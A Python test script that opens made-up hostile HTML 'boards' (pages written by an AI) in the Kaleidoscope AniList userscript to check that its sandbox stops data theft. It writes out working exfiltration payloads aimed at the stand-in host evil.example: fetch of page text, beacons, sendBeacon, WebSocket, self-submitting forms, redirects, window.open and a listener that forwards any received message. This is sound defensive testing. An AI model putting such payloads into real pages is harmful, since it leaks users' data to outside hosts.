"""Check that a Kaleidoscope board can't send anything anywhere, or get hold of your data.

    python3 tools/boardtest.py [script]

A board is a page an AI wrote, so Kaleidoscope treats it as untrusted code (CLAUDE.md, Security). This
opens made-up hostile boards in desktop Kaleidoscope (or the copy given, to compare an older one):
- one that tries every way out it can: fetch, an image beacon, sendBeacon, a WebSocket, a stylesheet and
  a CSS background from another site, a form that submits itself, window.open, a link, a meta refresh,
  WebRTC, and navigating its own frame later on; and that listens for any message Kaleidoscope sends it
- boards that navigate their own frame at once, before their first load event, to another site, to a
  data: page and to about:blank, each with a listener waiting for whatever Kaleidoscope sends next
- the same boards saved with Kaleidoscope's Save button and opened as a file of their own
It passes when nothing reaches evil.example, no board or page it turned into ever receives your
recent activity (or any other data), and what a real board needs still works: AniList's API, AniList's
cover images, and "Open on AniList" (opened by Kaleidoscope, AniList addresses only). The recent
activity itself shows on the page around the board. Prints "clean" or the problems.
"""
import json, os, subprocess, sys, tempfile
HERE = os.path.dirname(os.path.abspath(__file__)); R = os.path.dirname(HERE)
sys.path.insert(0, HERE)
from screens import CLOCK

EVIL = 'evil.example'
# any message the board (or whatever replaced it) receives gets reported to the one address it may reach
SPY = '''<script>window.addEventListener('message', function (e) {
  fetch('https://graphql.anilist.co', { method: 'POST', body: 'GOT-MESSAGE ' + JSON.stringify(e.data).slice(0, 120) }).catch(function () {});
  fetch('https://evil.example/got?d=' + encodeURIComponent(JSON.stringify(e.data).slice(0, 120))).catch(function () {});
});</script>'''
EVERYTHING = r'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>Hostile board</title>''' + SPY + r'''
<link rel="stylesheet" href="https://evil.example/style.css">
<style>body{background:url(https://evil.example/bg.png)}</style>
<meta http-equiv="refresh" content="1;url=https://evil.example/meta-refresh">
</head><body>
<h1>Recommendations</h1><h2>Taste profile</h2>
<img src="https://s4.anilist.co/file/anilistcdn/media/anime/cover/large/bx1.jpg" alt="">
<img src="https://evil.example/pixel.gif" alt="">
<a id="ok" href="https://anilist.co/anime/1">Open on AniList</a>
<a id="bad" href="https://evil.example/link?d=secret">Somewhere else</a>
<form id="f" action="https://evil.example/form" method="post"><input name="d" value="secret"></form>
<script>
  var data = document.body.innerText;
  try { fetch('https://evil.example/fetch?d=' + encodeURIComponent(data)); } catch (e) {}
  try { new Image().src = 'https://evil.example/beacon?d=1'; } catch (e) {}
  try { navigator.sendBeacon('https://evil.example/sendbeacon', data); } catch (e) {}
  try { new WebSocket('wss://evil.example/ws'); } catch (e) {}
  try { document.getElementById('f').submit(); } catch (e) {}
  try { window.open('https://evil.example/window-open?d=1'); } catch (e) {}
  try { window.open('https://anilist.co/anime/2'); } catch (e) {}
  document.getElementById('ok').click();
  document.getElementById('bad').click();
  // what a real board does: ask AniList for a cover, and report whether WebRTC is reachable
  fetch('https://graphql.anilist.co', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ query: '{ Media(id: 1) { id } }', webrtc: typeof RTCPeerConnection }) }).catch(function () {});
  setTimeout(function () { try { location.href = 'https://evil.example/navigate'; } catch (e) {} }, 600);
</script></body></html>'''
# navigate at once, before the first load event: whatever loads next must never be sent anything
def instant(target):
    return '<!DOCTYPE html><html><head><script>location.replace(' + json.dumps(target) + ')</script></head><body>Taste profile</body></html>'
DATA_SPY = 'data:text/html,' + SPY.replace('\n', ' ')
BOARDS = {'everything': EVERYTHING, 'instant-away': instant('https://evil.example/steal'),
          'instant-data': instant(DATA_SPY), 'instant-blank': instant('about:blank')}

SAVE = """(async () => {
  await new Promise(r => setTimeout(r, 800));
  const make = URL.createObjectURL.bind(URL);
  let blob = null; URL.createObjectURL = b => { blob = b; return 'blob:saved'; };
  const btn = [...document.querySelectorAll('button')].find(b => /Save/.test(b.textContent));
  if (!btn) return { error: 'no Save button' };
  btn.click(); await new Promise(r => setTimeout(r, 300));
  if (!blob) return { error: 'Save made no file' };
  // open the saved file as a page of its own, as it would be from your downloads
  const w = window.open(make(new Blob([await blob.text()], { type: 'text/html' })));
  if (!w) return { error: 'could not open the saved file' };
  await new Promise(r => setTimeout(r, 3000));
  let sandboxed = null; try { sandboxed = !!w.document.querySelector('iframe[sandbox="allow-scripts"]'); } catch (e) { sandboxed = 'unknown: ' + e.message; }
  return { saved: true, sandboxed, at: (() => { try { return w.location.href.slice(0, 60); } catch (e) { return 'elsewhere'; } })() };
})()"""

def open_board(script, html, js=None):
    store = {'kaleidoscope.boards': [{'id': 'hostile', 'html': html, 'type': 'ANIME', 'user': 'JigglyPug', 'ts': 1762220400000, 'label': 'Test'}]}
    seed = tempfile.NamedTemporaryFile('w', suffix='.json', delete=False); json.dump(store, seed); seed.close()
    js = js or """(async () => { await new Promise(r => setTimeout(r, 3000));
      const strip = document.querySelector('.krecent');
      return { opened: window.__opened || [], strip: strip ? strip.textContent : '' }; })()"""
    r = subprocess.run(['node', f'{HERE}/shot.js', script, 'https://anilist.co/home#kaleidoscope-board=hostile', '/dev/null', '--clock', CLOCK,
                        '--seed', seed.name, '--requests', '--commit', '--eval', js, '--print'], capture_output=True, text=True, timeout=180)
    os.unlink(seed.name)
    ev = next((l for l in r.stdout.splitlines() if l.startswith('EVAL ')), None)
    if not ev: raise RuntimeError((r.stderr or r.stdout)[-300:])
    return [l[4:] for l in r.stdout.splitlines() if l.startswith('REQ ')], json.loads(ev[5:]) or {}

def run(script=f'{R}/desktop/kaleidoscope/kaleidoscope.user.js'):
    bad = []
    for name, html in BOARDS.items():
        try: reqs, got = open_board(script, html)
        except RuntimeError as e: bad.append(f'[{name}] could not run: {e}'); continue
        opened = got.get('opened', [])
        bad += [f'[{name}] got out: {q}' for q in reqs if EVIL in q]
        bad += [f'[{name}] the board received data from Kaleidoscope: {q}' for q in reqs if 'GOT-MESSAGE' in q]
        bad += [f'[{name}] opened a tab outside AniList: {u}' for u in opened if EVIL in u]
        if name == 'everything':
            if not any('graphql.anilist.co' in q and 'Media(id: 1)' in q for q in reqs): bad.append("[everything] the board couldn't reach AniList's API (covers would break)")
            if not any('s4.anilist.co' in q for q in reqs): bad.append("[everything] the board couldn't load AniList's cover images")
            if not any(u.startswith('https://anilist.co/anime/1') for u in opened): bad.append('[everything] "Open on AniList" links no longer open')
            if not any(u.startswith('https://anilist.co/anime/2') for u in opened): bad.append('[everything] window.open() to AniList no longer opens')
            if any('"webrtc":"function"' in q for q in reqs): bad.append('[everything] WebRTC is still reachable inside the board')
            if 'Recent activity' not in got.get('strip', ''): bad.append('[everything] the recent activity strip no longer shows on the page around the board')
    # the same boards, saved and opened as a file of their own
    for name in ('everything', 'instant-away'):
        try: reqs, got = open_board(script, BOARDS[name], SAVE)
        except RuntimeError as e: bad.append(f'[saved {name}] could not run: {e}'); continue
        if got.get('error'): bad.append(f'[saved {name}] {got["error"]}'); continue
        bad += [f'[saved {name}] got out: {q}' for q in reqs if EVIL in q]
        if got.get('sandboxed') is not True: bad.append(f'[saved {name}] the saved file runs the board on its own, not in a sandboxed frame ({got.get("sandboxed")}, now at {got.get("at")})')
        if name == 'everything' and not any('anilist.co/anime/1' in q for q in reqs): bad.append('[saved everything] "Open on AniList" no longer opens from a saved board')
    return bad

if __name__ == '__main__':
    bad = run(*sys.argv[1:2])
    print('== kaleidoscope board: ' + ('clean' if not bad else f'{len(bad)} problem' + 's' * (len(bad) > 1)))
    for b in bad: print('  ' + b)
